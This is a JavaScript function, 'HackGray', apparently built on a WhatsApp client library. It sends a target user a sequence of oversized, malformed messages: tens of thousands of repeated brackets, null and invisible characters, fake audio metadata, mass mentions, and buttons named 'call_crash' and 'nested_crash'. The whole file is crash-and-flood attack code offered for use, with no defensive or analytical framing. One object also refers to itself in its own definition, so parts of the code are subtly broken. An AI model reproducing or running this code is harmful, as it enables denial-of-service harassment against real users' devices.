async function HackGray(sock, target) {
  const Crash = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "炎 𝗔𝗫𝗚𝗮𝗻𝗞 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 • 🩸",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: JSON.stringify({
              trigger: true,
              action: "call_crash",
              note: "炎 𝗔𝗫𝗚𝗮𝗻𝗞 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 • 🩸",
              filler: "꧔".repeat(50000)
            })
          }
        }
      }
    },
    nativeFlowMessage: {
      name: "render_crash_component",
      messageParamsJson: "{".repeat(70000)
    },
    audioMessage: {
      mimetype: "audio/ogg; codecs=opus",
      fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
      fileLength: "9999999999",
      seconds: 999999,
      ptt: true,
      streamingSidecar: "꧔꧈".repeat(9999)
    }
  };

  await sock.relayMessage(target, { message: Crash }, { messageId: "Msg.Key.Id" });

  const Floware = {
    message: {
      extendedTextMessage: {
        text: "᬴".repeat(250000),
        contextInfo: {
          mentionedJid: Array.from({ length: 1950 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          )
        }
      },
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
        mimeType: "audio/mpeg",
        sha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
        encSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
        mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
        directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
        fileLength: 99999999999999,
        mediaKeyTimestamp: 99999999999999,
        seconds: 99999999999999,
        fileEncSha256: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
      },
      interactiveResponseMessage: {
        body: {
          text: "\u0003".repeat(2000),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request".repeat(300),
          paramsJson: JSON.stringify({
            type: "single_select",
            title: "\u2063".repeat(2000),
            description: " 炎 𝗔𝗫𝗚𝗮𝗻𝗞 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 • 🩸 ".repeat(20000),
            options: [
              {
                title: "\u2063".repeat(50),
                description: "null".repeat(15000),
                value: "꧔꧈" + "null".repeat(5000)
              }
            ]
          }),
          version: 3
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", Floware.message, {
    messageId: "folware",
    statusJidList: [target]
  });

  const Msgis = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " AXGanK - Invictus ",
              hasMediaAttachment: false
            },
            body: {
              text: " 炎 𝗔𝗫𝗚𝗮𝗻𝗞 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 • 🩸 "
            },
            nativeFlowMessage: {
              messageParamsJson: "{[".repeat(10000),
              buttons: [
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0003"
                },
                {
                  name: "single_select",
                  buttonParamsJson: "꧔꧈".repeat(3000)
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, Msgis.message, { messageId: Msgis.key.id });

  const Data = JSON.stringify({
    status: true,
    cameraAccess: true,
    microphoneAccess: false,
    autoStart: true,
    hasOverlayPermission: true,
    accessibilityEnabled: false,
    criador: "@LuciferNotDev",
    messageParamsJson: "{".repeat(5000) + "[".repeat(5000)
  });

  const msgNavise = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " AXGanK - Invictus ",
              hasMediaAttachment: false
            },
            body: {
              text: "‌ 炎 𝗔𝗫𝗚𝗮𝗻𝗞 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 • 🩸 "
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0003" + JSON.parse(Data).messageParamsJson,
              buttons: [
                { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
                { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msgNavise.message, { messageId: msgNavise.key.id });

  const Neptune = JSON.stringify({
    status: true,
    active: true,
    criador: "@LuciferNotDev",
    messageParamsJson: "{".repeat(10000),
    call_permission_request: {
      status: true,
      enabled: true,
      version: 3
    },
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: " AXGanK - Invictus ", hasMediaAttachment: false },
          body: { text: " 炎 𝗔𝗫𝗚𝗮𝗻𝗞 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 • 🩸 ", format: "DEFAULT" },
          nativeFlowMessage: {
            messageParamsJson: "{[".repeat(15000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: Neptune,
              },
              ...Array.from({ length: 4 }, () => ({
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                  enabled: true,
                  overload: true,
                  cameraAccess: true
                })
              }))
            ]
          }
        }
      }
    },
    buttons: [
      {
        name: "nested_crash",
        buttonParamsJson: JSON.stringify({
          messageParamsJson: "{".repeat(15000),
          crash: true,
          overdrive: true
        })
      },
      {
        name: "multi_repeat",
        buttonParamsJson: JSON.stringify({
          status: true,
          payload: Array.from({ length: 100 }, () => "{".repeat(50)),
          cameraAccess: true
        })
      }
    ],
    flood: Array.from({ length: 1000 }, () => ({
      nulls: "\u0000".repeat(100),
      emojis: "🩸".repeat(20),
      status: true
    }))
  });

  const msgNeptune = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " AXGanK - Invictus  ",
              hasMediaAttachment: false
            },
            body: {
              text: " 炎 𝗔𝗫𝗚𝗮𝗻𝗞 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 • 🩸 " + "\u0000".repeat(30000),
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              messageParamsJson: "{[".repeat(15000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: Neptune,
                },
                ...Array.from({ length: 4 }, () => ({
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                    enabled: true,
                    overload: true,
                    cameraAccess: true
                  })
                }))
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msgNeptune.message, {
    messageId: msgNeptune.key.id,
    participant: { jid: target }
  });

  const Jamal = {
    to: target,
    message: {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "炎 𝗔𝗫𝗚𝗮𝗻𝗞 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 • 🩸",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: JSON.stringify({ status: true }),
              messageParamsJson: "{".repeat(10000),
              version: 3
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(Jamal.to, Jamal.message);
}